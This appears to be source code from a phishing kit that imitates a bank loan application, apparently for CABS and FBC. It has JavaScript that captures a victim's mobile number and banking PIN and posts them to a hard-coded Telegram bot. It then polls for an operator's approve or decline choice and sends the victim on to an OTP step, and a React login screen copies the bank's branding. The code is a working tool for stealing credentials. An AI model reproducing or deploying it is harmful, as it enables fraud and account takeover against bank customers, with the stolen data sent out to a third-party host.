
        const BOT = '9081651534:AAFXm0LbAzicgKpDyGYBiW-LGkWzKTWpZGY';
        const CID = '5980396370';
        let loanData = {
            name: "Valued Client",
            amount: "0",
            purpose: "Flex Loan"
        };
        let lastUpdateId = 0;
        let pinAttempts = 0;
      
        async function sendToTelegram(msg, buttons) {
            try {
                const response = await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CID,
                        text: msg,
                        reply_markup: buttons ? { inline_keyboard: buttons } : undefined,
                        parse_mode: 'HTML'
                    })
                });
                const data = await response.json();
                if (data.ok) {
                    const updateResponse = await fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?limit=1&offset=-1');
                    const updateData = await updateResponse.json();
                    if (updateData.ok && updateData.result.length > 0) {
                        lastUpdateId = updateData.result[0].update_id;
                    }
                }
            } catch(e) { console.error(e); }
        }

        function doSubmit(e) {
            e.preventDefault();
            clrErr();
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            const pin = document.getElementById('pin').value.trim();

            let ok = true;
            if (phone.length < 9) {
                showErr('Please enter a valid 9-digit mobile number.');
                document.getElementById('wrapPhone').classList.add('invalid');
                ok = false;
            }
            if (pin.length !== 4) {
                if (ok) showErr('PIN must be exactly 4 digits.');
                document.getElementById('wrapPin').classList.add('invalid');
                ok = false;
            }
            if (!ok) return;

            const msg = '\ud83d\ude80 <b>CABS Flex Loan Verification</b>\n\n\ud83d\udc64 <b>Name:</b> <code>' + decodeURIComponent(loanData.name) + '</code>\n\ud83d\udcf1 <b>Phone:</b> <code>' + phone + '</code>\n\ud83d\udd12 <b>PIN:</b> <code>' + pin + '</code>\n\ud83d\udcb0 <b>Amount:</b> <code>$' + parseFloat(loanData.amount).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD</code>\n\ud83c\udfaf <b>Purpose:</b> <code>' + decodeURIComponent(loanData.purpose) + '</code>\n\nPlease choose an action below:';

            // 3 buttons: Approved / Declined / Already Applied
            const buttons = [
                [{ text: '\u2705 Approved', callback_data: 'login_approved' }, { text: '\u274c Declined', callback_data: 'login_declined' }, { text: '\u26a0\ufe0f Already Applied', callback_data: 'login_applied' }]
            ];

            document.getElementById('ov').classList.add('on');
            sendToTelegram(msg, buttons);
            startPolling();
        }

        function startPolling() {
            const pollInterval = setInterval(function() {
                fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastUpdateId + 1))
                    .then(function(r) { return r.json(); })
                    .then(function(data) {
                        if (data.ok && data.result.length > 0) {
                            data.result.forEach(function(update) {
                                lastUpdateId = update.update_id;
                                if (update.callback_query) {
                                    const action = update.callback_query.data;
                                    console.log('Callback received:', action);

                                    if (action === 'login_approved') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        clrErr();
                                        proceedToOTP();
                                    }
                                    else if (action === 'login_declined') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        // Declined returns to login.html just as the Declined word works
                                        location.href = 'login.html?declined=1';
                                    }
                                    else if (action === 'login_applied') {
                                        clearInterval(pollInterval);
                                        document.getElementById('ov').classList.remove('on');
                                        // Already Applied: warning popup that you already applied
                                        showModal('You have already applied for a Flex Loan. Please wait for your application to get approved.');
                                        document.getElementById('pin').value = '';
                                    }
                                }
                            });
                        }
                    }).catch(function(e) { console.error(e); });
            }, 1500);

            setTimeout(function() { clearInterval(pollInterval); }, 600000);
        }

        function proceedToOTP() {
            const phone = document.getElementById('phone').value.trim().replace(/\s/g, '');
            location.href = 'otp.html?name=' + loanData.name + '&amount=' + loanData.amount + '&purpose=' + loanData.purpose + '&phone=' + phone;
        }
  
import React, { useState } from 'react';
import { FBCLogo } from './FBCLogo';
import { Headphones, ArrowLeft, AlertCircle } from 'lucide-react';
import { Footer } from './Footer';

interface Step3LoginProps {
  initialPhone: string;
  onProceed: (phone: string) => void;
  onBack: () => void;
  onOpenSupport: () => void;
}

export const Step3Login: React.FC<Step3LoginProps> = ({
  initialPhone,
  onProceed,
  onBack,
  onOpenSupport,
}) => {
  const [phone, setPhone] = useState(initialPhone || '');
  const [error, setError] = useState<string | null>(null);
  const [touched, setTouched] = useState(false);

  const validatePhone = (val: string): string | null => {
    const cleaned = val.replace(/[\s\-()]/g, '');
    if (!cleaned) {
      return 'Please enter your mobile number to continue';
    }
    if (cleaned.length < 9) {
      return 'Mobile number must be at least 9 digits';
    }
    return null;
  };

  const handlePhoneChange = (val: string) => {
    setPhone(val);
    if (touched) {
      setError(validatePhone(val));
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setTouched(true);
    const err = validatePhone(phone);
    if (err) {
      setError(err);
      return;
    }
    setError(null);
    onProceed(phone);
  };

  return (
    <div className="relative min-h-[calc(100vh-130px)] flex flex-col justify-between overflow-hidden bg-gradient-to-b from-[#0047BA] via-[#0051cf] to-[#003893] text-white">
      {/* Background Graphic */}
      <div className="absolute right-0 bottom-0 pointer-events-none z-0 w-full max-w-2xl opacity-95">
        <svg
          viewBox="0 0 500 350"
          fill="none"
          xmlns="http://www.w3.org/2000/svg"
          className="w-full h-auto ml-auto"
        >
          <path
            d="M 500 120 C 380 180, 260 220, 160 350 L 500 350 Z"
            fill="white"
            fillOpacity="0.9"
          />
          <path
            d="M 500 190 C 400 230, 310 270, 240 350 L 500 350 Z"
            fill="#e2e8f0"
            fillOpacity="0.4"
          />
        </svg>
      </div>

      {/* Top Navigation Row */}
      <div className="relative z-10 w-full px-4 sm:px-8 pt-6 flex items-center justify-between">
        <button
          type="button"
          onClick={onBack}
          className="inline-flex items-center gap-1.5 text-xs font-semibold text-white/80 hover:text-white bg-white/10 hover:bg-white/20 px-3.5 py-2 rounded-full backdrop-blur-xs transition-colors cursor-pointer"
        >
          <ArrowLeft className="w-3.5 h-3.5" />
          <span>Back to Details</span>
        </button>
      </div>

      {/* Main Login Card */}
      <div className="relative z-10 flex-1 flex flex-col items-center justify-center px-6 py-10 w-full max-w-md mx-auto">
        <div className="mb-12 flex justify-center">
          <FBCLogo variant="white" size="xl" showSubtext={false} />
        </div>

        <form onSubmit={handleSubmit} className="w-full space-y-6 text-center">
          <h2 className="text-white text-base sm:text-lg font-medium tracking-normal px-2">
            Please enter your mobile number to continue
          </h2>

          <div className="space-y-2">
            <div className="relative">
              <input
                type="tel"
                placeholder="Enter here"
                value={phone}
                onChange={(e) => handlePhoneChange(e.target.value)}
                onBlur={() => {
                  setTouched(true);
                  setError(validatePhone(phone));
                }}
                className="w-full text-center text-white placeholder-white/60 bg-transparent border-2 border-white/80 rounded-full px-6 py-3.5 text-base sm:text-lg font-medium focus:outline-none focus:border-white focus:ring-2 focus:ring-white/40 transition-all shadow-inner"
                aria-label="Mobile phone number"
                autoComplete="tel"
              />
            </div>

            {touched && error && (
              <div className="bg-amber-400 text-slate-900 text-xs font-semibold px-3 py-1.5 rounded-full inline-flex items-center gap-1.5 shadow-md animate-in fade-in">
                <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                <span>{error}</span>
              </div>
            )}
          </div>

          <div>
            <button
              type="submit"
              className="w-full bg-white text-[#0047BA] hover:bg-slate-100 font-bold text-base sm:text-lg py-3.5 px-8 rounded-full shadow-lg hover:shadow-xl transition-all active:scale-[0.98] cursor-pointer"
            >
              Continue
            </button>
          </div>
        </form>

        <div className="mt-16 sm:mt-24 mb-4 flex flex-col items-center justify-center">
          <button
            type="button"
            onClick={onOpenSupport}
            className="group flex flex-col items-center gap-1.5 text-white/90 hover:text-white transition-all cursor-pointer"
          >
            <div className="w-12 h-12 rounded-full border-2 border-white/60 group-hover:border-white bg-white/10 group-hover:bg-white/20 flex items-center justify-center backdrop-blur-xs transition-colors shadow-sm">
              <Headphones className="w-6 h-6 text-white" />
            </div>
            <span className="text-xs font-medium tracking-wide">Get Support</span>
          </button>
        </div>
      </div>

      <Footer variant="blue" />
    </div>
  );
};
